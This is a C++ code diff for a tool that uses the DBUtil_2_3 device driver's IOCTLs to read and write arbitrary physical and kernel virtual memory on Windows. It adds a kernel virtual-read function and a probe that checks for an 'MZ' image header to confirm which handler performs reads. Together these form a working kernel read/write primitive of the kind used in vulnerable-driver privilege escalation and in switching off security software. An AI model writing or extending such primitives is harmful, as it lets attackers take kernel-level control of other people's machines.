@@ -55,6 +55,10 @@ constexpr size_t kKernHdr = 0x18;          // { u64 hdr; u64 va; u64 off }
 
 HANDLE g_dev = INVALID_HANDLE_VALUE;
 
+// Set by vread_probe() once the 0x9B0C1EC4 handler is proven to be the read
+// half. Until then kread_trusted() refuses to use it.
+bool g_vread_ok = false;
+
 bool open_dev() {
     g_dev = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
@@ -93,6 +97,9 @@ bool do_write(uint64_t pa, const void* in, size_t len) {
 
 bool do_vread(uint64_t va, void* out, size_t len) {
     if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
+    // Same guard as the write path: a non-canonical value sent to the kernel
+    // handler would be dereferenced by memmove.
+    if (va < 0xFFFF800000000000ull) return false;
     std::vector<uint8_t> buf(kKernHdr + len, 0);
     memcpy(buf.data() + 0x08, &va, 8);
     const uint64_t off = 0;
@@ -127,7 +134,7 @@ bool do_vwrite(uint64_t va, const void* in, size_t len) {
 // from the start, init() would short-circuit on the `if (g_be)` check and
 // never open the device, reporting success with no driver present.
 Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev,
-                   do_read, do_write, do_vwrite};
+                   do_read, do_write, do_vwrite, do_vread};
 const Backend* g_be = nullptr;
 
 } // anonymous namespace
@@ -198,6 +205,51 @@ bool pwrite(uint64_t pa, const void* buf, size_t len) {
 bool vwrite(uint64_t va, const void* buf, size_t len) {
     if (!g_be) return false;
     return g_be->vwrite(va, buf, len);
+}
+
+bool vread(uint64_t va, void* buf, size_t len) {
+    if (!g_be) return false;
+    return g_be->vread(va, buf, len);
+}
+
+bool vread_ready() { return g_vread_ok; }
+
+// ---------------------------------------------------------------------------
+// Direction probe for the kernel-VA pair.
+//
+// The request carries the header only (input length 0x18, zero payload), while
+// the output buffer is long enough for the payload. Interpreted as a read, the
+// handler fills the output from `va`. Interpreted as a write, it has zero
+// payload bytes to copy, so nothing is written. That is the one shape which is
+// harmless under both readings, and it is therefore the only probe we send.
+//
+// If the image turns out to require input length == output length for reads,
+// the probe simply fails and the caller falls back to the page walk; we do NOT
+// retry with a full-length payload, because under the write reading that would
+// be a real (if tiny) kernel write.
+// ---------------------------------------------------------------------------
+bool vread_probe(uint64_t va, size_t len) {
+    if (g_vread_ok) return true;
+    if (g_dev == INVALID_HANDLE_VALUE || !len || len > 64) return false;
+    if (va < 0xFFFF800000000000ull) return false;
+
+    std::vector<uint8_t> in(kKernHdr, 0);
+    memcpy(in.data() + 0x08, &va, 8);
+
+    std::vector<uint8_t> out(kKernHdr + len, 0xCC);
+    DWORD got = 0;
+    if (!DeviceIoControl(g_dev, kKernRead, in.data(), (DWORD)in.size(),
+                         out.data(), (DWORD)out.size(), &got, nullptr))
+        return false;
+
+    static const uint8_t mz[2] = { 'M', 'Z' };
+    if (len >= 2) {
+        // Handlers either append past the header (the layout do_read/do_vwrite
+        // use) or copy into the start of the shared buffer. Check both.
+        if (memcmp(out.data() + kKernHdr, mz, 2) == 0) { g_vread_ok = true; return true; }
+        if (memcmp(out.data(), mz, 2) == 0)            { g_vread_ok = true; return true; }
+    }
+    return false;
 }
 
 // ---------------------------------------------------------------------------
